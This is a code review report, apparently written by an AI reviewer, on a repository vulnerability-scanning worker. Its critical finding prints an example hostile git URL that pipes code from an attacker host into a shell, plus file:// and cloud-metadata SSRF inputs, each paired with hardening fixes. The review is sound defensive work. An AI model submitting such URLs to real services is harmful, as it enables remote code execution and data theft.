---
phase: 03-scan-engine-adapters-queue-worker-service
reviewed: 2026-07-10T00:00:00Z
depth: deep
mode: advisory
files_reviewed: 20
files_reviewed_list:
  - apps/api/src/scan/scan.repository.ts
  - apps/api/src/scan/scan.repository.port.ts
  - apps/api/src/scan/scan.service.ts
  - apps/api/src/scan/scan.types.ts
  - apps/api/src/scan/scan.module.ts
  - apps/api/src/domain/scan.types.ts
  - apps/api/src/domain/vulnerability.types.ts
  - apps/api/src/engine/scan-engine.ts
  - apps/api/src/engine/scan-worker.ts
  - apps/api/src/engine/adapter-factory.ts
  - apps/api/src/engine/repo-cloner.adapter.ts
  - apps/api/src/engine/repo-cloner.port.ts
  - apps/api/src/engine/trivy-runner.adapter.ts
  - apps/api/src/engine/trivy-runner.port.ts
  - apps/api/src/engine/subprocess-runner.ts
  - apps/api/src/engine/scan-path-allocator.adapter.ts
  - apps/api/src/engine/scan-path-allocator.port.ts
  - apps/api/src/engine/temp-artifact-cleaner.ts
  - apps/api/src/engine/scan-error.ts
  - apps/api/src/config/env.validation.ts
  - apps/api/src/worker.ts
  - apps/api/src/worker.module.ts
  - apps/api/scripts/scan-engine-feasibility.mjs
  - apps/api/scripts/worker-process-contract.mjs
  - .github/workflows/scan-engine.yml
findings:
  critical: 1
  high: 2
  medium: 3
  low: 5
  total: 11
status: issues_found
---

# Phase 03: Code Review Report (Advisory)

**Reviewed:** 2026-07-10
**Depth:** deep (cross-file: engine ↔ adapters ↔ repository ↔ worker bootstrap)
**Files Reviewed:** 20 source + 3 harness/CI
**Status:** issues_found (advisory — phase is verified complete; these are for Phase 4 / follow-up)

## Summary

The Phase 3 scan engine is well-architected: the framework-free `ScanEngine`/`ScanWorker` split is clean, the concurrency-one lifecycle ordering (allocate → Scanning → clone → Trivy → stream-parse with awaited ordered appends → Finished) is correct, cleanup is awaited in `finally` and can never mask the primary result, and the memory contract is respected end-to-end (subprocess stdout is `ignore`d, Trivy writes to `--output`, the parser is consumed via `for await`, and there is no `fs.readFile`/`JSON.parse` on the report path — the only `JSON.parse` is on small per-vulnerability list entries in Redis, which is compliant). Command construction is argv-array + `shell:false` throughout, and the `--` end-of-options separator correctly closes the leading-dash flag-injection vector. Docker mounts are correctly scoped (`/src:ro`, separate writable `/out`, tmpfs cache).

The dominant residual risk is at the **git transport boundary**: the repo URL reaches `git clone` with no protocol allowlist, which exposes git's `ext::`/`file://` transports (remote code execution and local-file disclosure) independent of the `--` separator. There is also **no subprocess timeout**, so a single hung clone/scan permanently stalls the concurrency-one worker, and the **`SCAN_ENGINE_TEST_FAULT` fault-injection knob is honored in production** with no `NODE_ENV` guard, letting a stray env var silently disable all real scanning. These are the items Phase 4 should address before this is exposed to untrusted input.

---

## Critical Issues

### CR-01: Repo URL reaches `git clone` with no protocol allowlist — `ext::`/`file://` transport = RCE + local-file disclosure

**File:** `apps/api/src/engine/repo-cloner.adapter.ts:32-38` (with `apps/api/src/engine/subprocess-runner.ts:83-87`)

**Issue:** `clone()` passes the user-supplied `repoUrl` straight into `git clone --depth 1 -- <url> <dir>` with `shell:false` and inherited `process.env`. The argv array and `--` correctly defeat shell-metacharacter injection and leading-dash flag injection — but they do **not** constrain git's *transport layer*. `ScanService.enqueue` performs no validation (deferred to Phase 4 by design), and nothing in the clone path restricts the URL scheme. git, invoked directly by the user, allows the `ext::` transport by default (`protocol.ext.allow=user`):

- `repoUrl = "ext::sh -c 'curl attacker/x|sh'"` → arbitrary command execution inside the worker container (RCE) — the exact class of finding a senior reviewer probes for on a supply-chain scanner.
- `repoUrl = "file:///etc/"` or `file:///proc/...` → clones host filesystem contents into the scan sandbox, then Trivy-scans and the engine exfiltrates them as "findings" (local-file disclosure / SSRF-adjacent).
- `repoUrl = "http://169.254.169.254/..."` / internal hosts → SSRF against cloud metadata and internal services.

**Scenario:** Any caller who can submit a scan (the whole point of the service) submits an `ext::` URL; the worker executes attacker code as the container user.

**Fix:** Harden at the clone adapter regardless of where URL-shape validation lands, and add an explicit allowlist upstream in Phase 4:
```ts
// repo-cloner.adapter.ts — force git to reject every transport except https
await this.runner.run(
  this.gitCommand,
  ['-c', 'protocol.allow=never',
   '-c', 'protocol.https.allow=always',
   'clone', '--depth', '1', '--', repoUrl, cloneDir],
  { shell: false, env: { ...process.env, GIT_ALLOW_PROTOCOL: 'https', GIT_TERMINAL_PROMPT: '0' } },
);
```
Plus a Phase-4 scheme allowlist (`https:` only, reject `file:`/`ext:`/`ssh:`/host-in-private-range) before the job is ever enqueued. Note `subprocess-runner.run` currently accepts no `env` option — extend `SubprocessRunOptions` to carry a locked-down `env`.

---

## High

### HIGH-01: No subprocess timeout — a hung `git`/`trivy` permanently stalls the concurrency-one worker (DoS) and can hang on credential prompts

**File:** `apps/api/src/engine/subprocess-runner.ts:76-132`

**Issue:** `createSpawnSubprocessRunner` sets no `timeout` and never kills the child. Because the worker runs `{ concurrency: 1 }` (`scan-worker.ts:27`), a single subprocess that never exits blocks *every* subsequent scan indefinitely. Triggers include: a huge/slow clone, a Trivy vuln-DB download stall, or a private repo where git blocks waiting on credentials. `stdin` is `'ignore'`, which helps, but askpass/credential-helper paths and `GIT_TERMINAL_PROMPT` (unset) can still hang. The CI job has `timeout-minutes`, but the *runtime* has no equivalent.

**Scenario:** One clone against an unresponsive/malicious host hangs → the worker's single slot is consumed forever → all queued scans stop processing with no error and no recovery until manual restart.

**Fix:** Add a per-run timeout that kills the child (SIGKILL after a grace SIGTERM) and rejects with a `launchFailed:false` `SubprocessRunError` (so it is a genuine stage failure, not a Docker fallback). Set distinct budgets for clone vs. Trivy, and set `GIT_TERMINAL_PROMPT=0`.

### HIGH-02: `SCAN_ENGINE_TEST_FAULT` is honored in production with no `NODE_ENV` guard — a stray env var silently disables all real scanning

**File:** `apps/api/src/config/env.validation.ts:24-26`, `apps/api/src/worker.module.ts:56-62`, `apps/api/src/engine/adapter-factory.ts:89-105`

**Issue:** When `SCAN_ENGINE_TEST_FAULT` is any value other than `none`, `createEngineAdapters` returns **entirely fake in-memory doubles** — no clone, no Trivy, no disk I/O — and (for `parse`-adjacent success paths) the fault parser can even yield a canned `CVE-FAULT-0001` CRITICAL. The schema accepts this knob unconditionally with only a `.default('none')`, and there is no `NODE_ENV`/production guard. `worker-process-contract.mjs` explicitly exercises this with `NODE_ENV: 'production'`, confirming it is live in production builds.

**Scenario:** A misconfigured deploy (or an attacker/insider who can set an env var) sets `SCAN_ENGINE_TEST_FAULT=trivy` → the security scanner boots healthy, emits its readiness marker, and thereafter marks every scan `Failed` (or, in the benign baseline path, does no real scan) while doing zero actual vulnerability detection. For a product whose entire value is "did we find the CRITICALs," silently returning fabricated or empty results is a severe integrity failure.

**Fix:** Reject any non-`none` fault outside test. In the schema use `Joi.when('NODE_ENV', { is: 'test', then: ..., otherwise: Joi.valid('none').default('none') })`, or assert in `worker.module.ts` that `fault === 'none'` unless `NODE_ENV === 'test'`. Apply the same guard to `SCAN_ENGINE_READY_MARKER`.

---

## Medium

### MED-01: Docker Trivy runs as root; root-owned report in host `/out` mount can defeat non-root cleanup → artifact accumulation fills `SCAN_TMP_DIR`

**File:** `apps/api/src/engine/trivy-runner.adapter.ts:114-139`

**Issue:** The Docker fallback runs `docker run` with no `--user`, so Trivy runs as root inside the container and writes `report.json` into the bind-mounted host `reportParent` as `root:root`. The worker process (typically non-root, especially under the 200MB-limited container) then calls `TempArtifactCleanerAdapter.remove` → `fs.rm(force)`, which fails `EACCES` on a root-owned file. Per D-22 that error is logged and swallowed — correct for not masking results, but it means the report leaks. Over a long-lived worker's lifetime, orphaned reports steadily consume `SCAN_TMP_DIR`, which directly threatens the disk-full / memory-constrained operating envelope this project is built around.

**Scenario:** Docker path is taken (no local `trivy`), scan completes, cleanup silently fails on the root-owned report; repeated over many scans → disk fills → later scans fail `disk-full` for an unrelated reason.

**Fix:** Add `'--user', `${process.getuid?.()}:${process.getgid?.()}`` (POSIX) to `buildDockerArgs`, or `chmod`/`chown` the out dir, so report files are owned by the host user and cleanup succeeds.

### MED-02: `markFailed` bounds but does not redact — persistence layer trusts the caller not to leak secrets

**File:** `apps/api/src/scan/scan.repository.ts:111-123` and `:167-182`

**Issue:** Redaction of credentials/paths (D-21) lives only in `engine/scan-error.ts#redact`, invoked by `ScanEngine.persistFailed`. The repository's `markFailed`/`serialize` only `.slice(0, 500)` the detail — no redaction. The domain type comment (`domain/scan.types.ts:22-24`) asserts "credentials … must never reach this field," but that invariant is enforced *only* by the current single caller. Any future or alternate caller (a GraphQL mutation, a re-driver, a manual admin tool) that passes a raw error detail to `markFailed` would persist secrets to Redis with 7-day retention.

**Scenario:** Phase 4 adds a code path that calls `repository.markFailed(id, { category, detail: rawStderrOrUrl })` → credentials/absolute paths land in Redis, defeating T-03-07.

**Fix:** Make redaction an invariant of the persistence boundary: call a shared `redact()` inside `markFailed`/`serialize` (idempotent with the engine's redaction), so the guarantee holds regardless of caller.

### MED-03: `get()` reads hash and list non-atomically — a concurrent transition can surface an inconsistent snapshot

**File:** `apps/api/src/scan/scan.repository.ts:77-87`

**Issue:** `get` issues `hgetall` then a separate `lrange` with no `MULTI`/`WATCH`. Every write path (`appendVulnerability`, `markFinished`) is atomic individually, but a reader interleaving between the two round-trips can observe a hash `status` that disagrees with the vulnerability list — e.g. status still `Scanning` but the list already contains a vuln appended after the `hgetall`, or (rarer) a `Finished` status paired with a list missing a finding appended in the gap. For a status-polling API this yields transiently incoherent responses.

**Scenario:** Frontend polls `GET /scan/:id` during active parsing; a response reports `Finished` with N findings while a near-simultaneous one reports `Scanning` with N+1 — confusing, and worse if a consumer treats `Finished` as "list is now complete."

**Fix:** Read both keys in one `MULTI` (`multi().hgetall(key).lrange(list,1,-1).exec()`), or `WATCH`+re-read on the hash, so the snapshot is coherent.

---

## Low

### LOW-01: `redact()` URL-userinfo regex leaks trailing characters when the secret contains `@`

**File:** `apps/api/src/engine/scan-error.ts:58`

**Issue:** `/([a-zA-Z][\w+.-]*:\/\/)[^\s/@]+@/` stops the userinfo capture at the first `@`. A token containing `@` (`https://user:p@ss@host`) redacts to `https://***@ss@host`, leaking `ss`. Low likelihood (userinfo `@` should be percent-encoded), and the persisted `detail` currently derives from `error.message` (which for `SubprocessRunError` carries no URL), so this is defense-in-depth only.
**Fix:** Anchor to the last `@` before the host, e.g. `([a-zA-Z][\w+.-]*:\/\/)[^\s/]+@` scoped to a single URL token, or parse with `URL`.

### LOW-02: Failure stage can be misclassified around Redis-only steps

**File:** `apps/api/src/engine/scan-engine.ts:114-137`

**Issue:** `stage` is `'clone'` when `markScanning` runs, so a Redis failure there is persisted as category `clone`; likewise a `markFinished` failure after a clean parse is classified `parse` (stage never advances past the loop). Categories are advisory/bounded, so impact is minor, but the persisted category can misattribute a Redis fault to clone/parse.
**Fix:** Introduce an explicit `'persist'`/`'redis'` stage (or set `stage = 'finalize'` before `markFinished`) so infrastructure faults are not attributed to clone/parse.

### LOW-03: `SCAN_TMP_DIR` is not validated as an absolute, writable path

**File:** `apps/api/src/config/env.validation.ts:16`

**Issue:** `Joi.string().required()` accepts any string, including a relative path that resolves against the worker's CWD, or a non-existent/unwritable directory (surfaced only later as an allocator failure classified `clone`). For the sandbox root of a security tool, stronger boot-time validation is warranted.
**Fix:** Validate absolute (`.pattern(/^\//)` on POSIX or a `path.isAbsolute` custom check) and, ideally, probe writability at bootstrap so misconfiguration fails closed at startup rather than per-scan.

### LOW-04: `create()` ignores the `MULTI` result and unconditionally `del`s

**File:** `apps/api/src/scan/scan.repository.ts:60-75`

**Issue:** `create` does `del key; del list; hset …; rpush …; expire …` in a plain `MULTI` and never inspects `exec()`'s per-command results. UUID collisions are effectively impossible so the unconditional `del` is safe, but a partial command failure inside the transaction would go unnoticed.
**Fix:** Inspect the `exec()` result array for per-command errors and surface them, or document that `create` is fire-and-verify by design.

### LOW-05: `SCAN_ENGINE_READY_MARKER=log` writes an absolute report path to stdout

**File:** `apps/api/src/engine/adapter-factory.ts:77-80`

**Issue:** `reportReadyStdoutProducer` emits `REPORT_READY <absolute reportPath>` on stdout. It is opt-in observability (default `none`) and paths are not secrets, but it does surface internal filesystem layout to logs. Combine with the HIGH-02 production-guard so this marker cannot be enabled in production.
**Fix:** Gate behind `NODE_ENV !== 'production'` alongside the fault-injection guard, or redact the path to its basename.

---

## Notes (verified clean — no action)

- Memory contract holds: `subprocess-runner` uses `stdio: ['ignore','ignore','pipe']` with an 8 KiB stderr cap; Trivy writes via `--output`; the engine consumes the parser with `for await` and awaits each append; no `fs.readFile`/`JSON.parse` on the report path.
- Command safety: all three subprocess call sites use argv arrays + `shell:false`; `git clone … -- <url> <dir>` closes leading-dash flag injection (transport-scheme risk tracked in CR-01, a distinct vector).
- Redis terminal-state guards: `transition()` correctly `WATCH`es the hash, no-ops on a missing/expired record (never resurrects), preserves the first terminal state (D-10), refreshes both TTLs atomically, and bounds optimistic-lock retries. The list sentinel keeps TTLs synchronized so `appendVulnerability` cannot recreate a sentinel-less list.
- Cleanup precedence: `safeCleanup` in `finally` swallows secondary errors (D-22); `persistFailed` swallows persistence errors and rethrows the original (D-23); the cleaner treats `ENOENT` as success (idempotent).
- No-retry policy relies on BullMQ's default `attempts: 1` — implicit but correct; consider making it explicit via `defaultJobOptions` for auditability.
- No `any`, no dead code of note; the `WorkerHost` shell ↔ `ScanEngine` split is intact and `@nestjs/bullmq` is confined to `scan-worker.ts` as intended.

---

_Reviewed: 2026-07-10_
_Reviewer: Claude (gsd-code-reviewer, advisory mode)_
_Depth: deep_
